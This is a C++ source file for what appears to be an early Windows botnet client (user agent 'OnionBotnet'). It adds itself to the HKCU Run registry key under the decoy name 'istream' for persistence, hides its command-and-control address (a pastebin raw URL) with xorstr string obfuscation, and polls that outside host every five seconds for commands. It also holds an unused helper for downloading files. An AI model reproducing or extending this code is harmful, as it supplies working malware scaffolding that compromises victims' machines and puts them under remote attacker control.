#include <iostream>
#include "windows.h"
#include "webclient.hpp"
#include "xorstr.hpp"

using namespace std;

#pragma region all
void AutoRun()
{
    char arr[MAX_PATH] = { };
    GetModuleFileName(NULL, (LPSTR)arr, MAX_PATH);

    HKEY hKey;

    if (RegCreateKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, 0, KEY_ALL_ACCESS, NULL, &hKey, NULL) == ERROR_SUCCESS)
    {
        if (RegSetValueEx(hKey, "istream", NULL, REG_SZ, (LPBYTE)arr, sizeof(arr)) == ERROR_SUCCESS)
        {
            RegCloseKey(hKey);
        }
        return;
    }
}

string replaceAll(string subject, const string& search,
    const string& replace) {
    size_t pos = 0;
    while ((pos = subject.find(search, pos)) != string::npos) {
        subject.replace(pos, search.length(), replace);
        pos += replace.length();
    }
    return subject;
}

string DownloadString(string URL) {
    HINTERNET interwebs = InternetOpenA("OnionBotnet", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, NULL);
    HINTERNET urlFile;
    string rtn;
    if (interwebs) {
        urlFile = InternetOpenUrlA(interwebs, URL.c_str(), NULL, NULL, NULL, NULL);
        if (urlFile) {
            char buffer[2000];
            DWORD bytesRead;
            do {
                InternetReadFile(urlFile, buffer, 2000, &bytesRead);
                rtn.append(buffer, bytesRead);
                memset(buffer, 0, 2000);
            } while (bytesRead);
            InternetCloseHandle(interwebs);
            InternetCloseHandle(urlFile);
            string p = replaceAll(rtn, "|n", "\r\n");
            return p;
        }
    }
    InternetCloseHandle(interwebs);
    string p = replaceAll(rtn, "|n", "\r\n");
    return p;
}

void DownloadFile(LPCSTR URL, LPCSTR file_loc) {
    URLDownloadToFileA(0, URL, file_loc, 0, 0);
}
#pragma endregion


int main()
{
    AutoRun();
    
    while (1)
    {
        string url = xorstr("https://pastebin.com/raw/BevGNn35");
        string command = DownloadString(url);
        cout << command << endl;

        if (command == "test")
        {
            std::cout << "WORK!" << endl;
        }

        Sleep(5000);
    }
}